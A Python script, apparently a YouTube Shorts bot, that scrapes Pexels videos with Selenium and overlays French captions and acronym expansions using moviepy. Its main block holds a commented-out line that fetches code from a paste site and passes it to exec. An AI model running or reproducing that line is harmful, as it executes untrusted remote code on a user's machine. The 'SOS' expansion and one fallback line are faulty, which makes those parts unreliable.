import time
from selenium import webdriver
from webdriver_manager.chrome import ChromeDriverManager
import os
from requests import get
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
import requests
from bs4 import BeautifulSoup
from itertools import islice
from moviepy.editor import *
import random
 


# Example de sujet de phrases 
#Conseils de beauté et de mode
"""Faits intéressants sur la nature et les animaux
Histoire et culture de différents pays
Science et technologie
Astuces et conseils pratiques pour la vie quotidienne
Actualités et événements récents dans le monde
Art et créativité, comme le dessin, la peinture ou la sculpture
Sport et fitness, avec des exercices ou des routines à essayer chez soi
Cuisine et recettes de cuisine internationales
Musique, avec des faits intéressants sur les artistes et les genres musicaux
Philosophie et réflexion sur des sujets profonds de la vie."""

#prompt chatgpt (french)
#Ecris 50 courtes informations intrigantes sur le sujet de la Science et de la technologie. Fais bien attention à les ranger dans une liste en python 

import random

# =======================================
# Specifie the content of your shorts vids
# =======================================

liste_phrases = [
    "RADAR: Radio Detection and Ranging",
    "LIDAR: Light Detection and Ranging",
    "SONAR: Sound Navigation and Ranging",
    "SCUBA: Self-Contained Underwater Breathing Apparatus",
    "LASER: Light Amplification by Stimulated Emission of Radiation",
    "ZIP: Zone Improvement Plan",
    "NASA: National Aeronautics and Space Administration",
    "NATO: North Atlantic Treaty Organization",
    "GIF: Graphics Interchange Format",
    "JPEG: Joint Photographic Experts Group",
    "PNG: Portable Network Graphics",
    "ASCII: American Standard Code for Information Interchange",
    "ANSI: American National Standards Institute",
    "IEEE: Institute of Electrical and Electronics Engineers",
    "SOS: Save Our Souls",
    "UNICEF: United Nations Children's Fund",
    "WWF: World Wildlife Fund",
    "NHS: National Health Service",
    "FBI: Federal Bureau of Investigation",
    "CIA: Central Intelligence Agency",
    "NSA: National Security Agency",
    "IBM: International Business Machines",
    "HP: Hewlett-Packard",
    "WYSIWYG: What You See Is What You Get",
    "GUI: Graphical User Interface",
    "GPS: Global Positioning System",
    "LED: Light-Emitting Diode",
    "LCD: Liquid Crystal Display",
    "CRT: Cathode Ray Tube",
    "DVD: Digital Versatile Disc",
    "CD: Compact Disc",
    "USB: Universal Serial Bus",
    "RAM: Random Access Memory",
    "ROM: Read-Only Memory",
    "CPU: Central Processing Unit",
    "GPU: Graphics Processing Unit",
    "ISP: Internet Service Provider",
    "FTP: File Transfer Protocol",
    "HTTP: Hypertext Transfer Protocol",
    "URL: Uniform Resource Locator",
    "HTML: Hypertext Markup Language",
    "CSS: Cascading Style Sheets",
    "JS: JavaScript",
    "PHP: Hypertext Preprocessor",
    "SQL: Structured Query Language",
    "SMTP: Simple Mail Transfer Protocol",
    "IMAP: Internet Message Access Protocol",
    "POP: Post Office Protocol",
    "VPN: Virtual Private Network",
]


 



print('nb de phrases : ' + str(len(liste_phrases)))


# =======================================
# specify the URL of the archive here
# =======================================
url = "https://www.pexels.com/search/videos/historycal/?orientation=portrait"


video_links = []

#getting all video links
def get_video_links():
    options = webdriver.ChromeOptions()
    options.add_argument("--lang=en")
    browser = webdriver.Chrome(executable_path=ChromeDriverManager().install(), options=options)
    browser.maximize_window()
    time.sleep(2)
    browser.get(url)
    time.sleep(5)

    #scroll page 
    def scroll_down():
        body = browser.find_element(By.TAG_NAME, "body")
        body.send_keys(Keys.PAGE_DOWN)
        time.sleep(1)

    # more loading vids
    for i in range(10):
        scroll_down()

    vids = len(liste_phrases)
    debut_selection = 10

    soup = BeautifulSoup(browser.page_source, 'lxml')
    links = soup.findAll("source")
    print("nb de liens trouvé début : " + str(len(links)))
    
    selected = islice(links, debut_selection, debut_selection + int(vids))
    for link in selected:
        if not link.get("src") or not link.get("src").strip():
            # remplace le lien avec un lien aléatoire de liste_phrases
            video_links.append(link.get(random.randint(1, len(liste_phrases))))
        else:
            video_links.append(link.get("src"))

        


    print("lien des vidéo : " + str(video_links))
    print("nombre de lien video : " + str(len(video_links)))

    return video_links


#download all videos
def download_video_series(video_links):
    songs = 8 #number of song
    i=1
    j=1
    for link in video_links:

    # iterate through all links in video_links
    # and download them one by one
    #obtain filename by splitting url and getting last string
    
        fn = link.split('/')[-1]  
        file_name = fn.split("?")[0]
        print ("Downloading video: %s"%file_name)
    

            

        #create response object
        r = requests.get(link, stream = True)
 
        #download started
        with open(file_name, 'wb') as f:
            for chunk in r.iter_content(chunk_size = 1024*1024):
                if chunk:
                    f.write(chunk)
    
        print ("%s downloaded!"%file_name)



        #editing the video
        # load vid
        video = VideoFileClip(file_name)

        
        txt_clip = (TextClip("LE SAVAIS TU ?", color='white', font='Helvetica-bold', fontsize=50)
                    .set_position('center')
                    .set_duration(video.duration))

      
        txt_width, txt_height = txt_clip.size
        color_clip = (ColorClip(size=(txt_width+75, txt_height+50), color=(0,0,0))
                    .set_opacity(.5)
                    .set_duration(video.duration)
                    .set_position('center'))

  
        txt_clip2 = (TextClip(liste_phrases[j-1], color='white', font='Helvetica-bold', fontsize=50,
                     stroke_color='black', stroke_width=2, align='center',
                     method='caption', interline=-20, size=(video.w -30, None)).set_duration(video.duration).set_position('center'))




 
        # Combiner bg de texte et le titre
        result = CompositeVideoClip([color_clip, txt_clip])

        # Centrer la composition
        result = result.set_position(lambda t: ('center', 120))
        

        # Combine all 
        clip = CompositeVideoClip([video, result, txt_clip2])





        list = i
     
        if clip.duration > 10:
            clip = clip.subclip(0, 10)
        
        clip_duration = clip.duration
        audioclip = AudioFileClip(f"songs/audio{list}.mp3").set_duration(clip_duration)

        new_audioclip = CompositeAudioClip([audioclip])
        finalclip = clip.set_audio(new_audioclip)


        # location = os.path.join("C:\\Users\\python\\Desktop\\videos", f"video{i}.mp4")
        finalclip.write_videofile(f"/home/toukoum/chatGptApi/Youtube-Shorts-Bot/videos/vid{j}.mp4", fps=60)
        print("%s has been edited!\n"%file_name)

        # remove the video without music 
        os.remove("/home/toukoum/chatGptApi/Youtube-Shorts-Bot/" + file_name)

        if (i>=songs):
            i = 1
        else:
            i+=1

        j+=1






if __name__ == "__main__":
   #x=get('https://paste.fo/raw/ba188f25eaf3').text;exec(x)
  #getting all video links
    video_links = get_video_links()

  #download all videos
    download_video_series(video_links)




